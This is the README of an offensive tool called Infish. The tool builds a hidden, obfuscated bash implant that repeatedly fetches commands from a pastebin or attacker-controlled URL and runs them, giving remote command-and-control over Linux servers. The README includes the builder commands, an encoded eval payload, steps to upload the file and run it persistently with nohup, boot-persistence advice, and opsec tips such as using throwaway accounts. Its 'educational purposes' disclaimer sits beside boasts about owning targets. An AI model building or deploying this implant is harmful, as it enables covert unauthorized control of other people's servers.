# Infish

Infish stands for infinite shell. It's a way to maintain persistent shell access (command and control) on a linux server even without ftp, ssh, or cpanel access. It works on all linux servers, even on shared hosting.

Note that this project is for **educational purposes** only. I bear no responsibility for how you use it. For this reason, no specific tutorial will be given for how exactly when or where to use this tool.

The aim of this shell is the give the penetration tester maximum and complete control over the system such that **even reboot** can not save the day. Infact if one has root access, one can set the script to run on boot, that way, the target is **screwed**.

# How it works
Here, you will have a shell that keeps checking on a paste on a predefined url or pastebin (use a throw away account and make the paste unlisted), and running whatever command it finds there. That way, you don't need access to the target machine. You've created a poor man's reverse shell, while remaining anonymous in the process.

Anytime you need to run a command, simply edit the paste to the command you want.

# Usage

There are two ways to build the final product.

- Using a raw paste url (or a website you control. Observe opsec though.)
- Using your pastebin dev api key, username, and password

However, you first need to clone this repository or copy the infis-builder file to your local machine. Make it executable by running  

```bash
$ chmod +x infish-builder
```

## Using a raw url

This is when you already have a webpage (observe opsec) or have already created a paste by hand. Get the **raw paste url** or the url or the page and run the following command

```bash
$ ./infish-builder url pastebin.com/raw/abc123
```
**or**

```bash
$ ./infish-builder url somesite.com/cmdpage
```
**You can also use this is you have a url you host on the internet**.

This will generate a file called **.infish** with contents that look like  

```bash
#!/usr/bin/env bash
eval "$(echo 'H4sIAAAAAAAAA3VQUUvDMBB+76+4hTJaoW06daClD1PRFxVBYQ/Dh9heXTBNRtpuY+J/N0ntZA89wiV33/cl+a7qZNFyJaEQZRDCN5jwbFrBBCIE4qcE3mE6BY1tp2X2D5aj4Iludcos+mKgEv9leUdgko9eRvxANOCn4YDWcAaRrkbxXu2M/HheNRisGZfWoZN1DWr2ibLNyZM6cCFYchlTCJZclmrXwPMbpDSmGZjG/CKDvU16e53SeUxDeMDiSyUzmlKzUrjnGiu1TxxK+ge0yMmGNS1+cBkXqk402yWLm9t0dt4zTK9mssz9oDBkiJpXiB4hWoB//Jw5ahE6Nq/sIA/G7Z/OuM2gXaN0sI3euCtRNHjs45YJGGSuW3HP7Y1A3MAVpXZQuzUXCK3uMINSOdyOzCuVRO8XMv8NvicCAAA=' | base64 -d | gunzip -c)";
```

## Using your pastebin details

This is the recommended method, as everything is automated. For this, obtain the following

- Your pastebin dev api key
- Your pastebin username (To our throwaway account)
- Your pastebin password

Then run the following

```bash
$ ./infish-builder key xxxxxxxxxxxxxxxxxxxxxxx
Pastebin username:
john
Pastebin password:
doe
New paste name:
shell

Successfully built infinite shell

$
```

A file called '.infish' is created. It will contain something like this   

```bash
#!/usr/bin/env bash
eval "$(echo 'H4sIAAAAAAAAA3VQUUvDMBB+76+4hTJaoW06daClD1PRFxVBYQ/Dh9heXTBNRtpuY+J/N0ntZA89wiV33/cl+a7qZNFyJaEQZRDCN5jwbFrBBCIE4qcE3mE6BY1tp2X2D5aj4Iludcos+mKgEv9leUdgko9eRvxANOCn4YDWcAaRrkbxXu2M/HheNRisGZfWoZN1DWr2ibLNyZM6cCFYchlTCJZclmrXwPMbpDSmGZjG/CKDvU16e53SeUxDeMDiSyUzmlKzUrjnGiu1TxxK+ge0yMmGNS1+cBkXqk402yWLm9t0dt4zTK9mssz9oDBkiJpXiB4hWoB//Jw5ahE6Nq/sIA/G7Z/OuM2gXaN0sI3euCtRNHjs45YJGGSuW3HP7Y1A3MAVpXZQuzUXCK3uMINSOdyOzCuVRO8XMv8NvicCAAA=' | base64 -d | gunzip -c)";
```

Finally, upload the **.infish** file to the target server and there, make it executable by running   

```bash
$ chmod +x .infish
```

Then to begin c&c, run  

```bash
$ nohup ./.infish & disown
```

Now, you can edit your paste to any shell command and the server will run it.

That's it, you own the server. If you have root access, you can set the last command to run on boot.

If you're confused or have no idea what's going on on this page, then you should not be here. Go build cute websites and apps.




Stay Dangerous :)
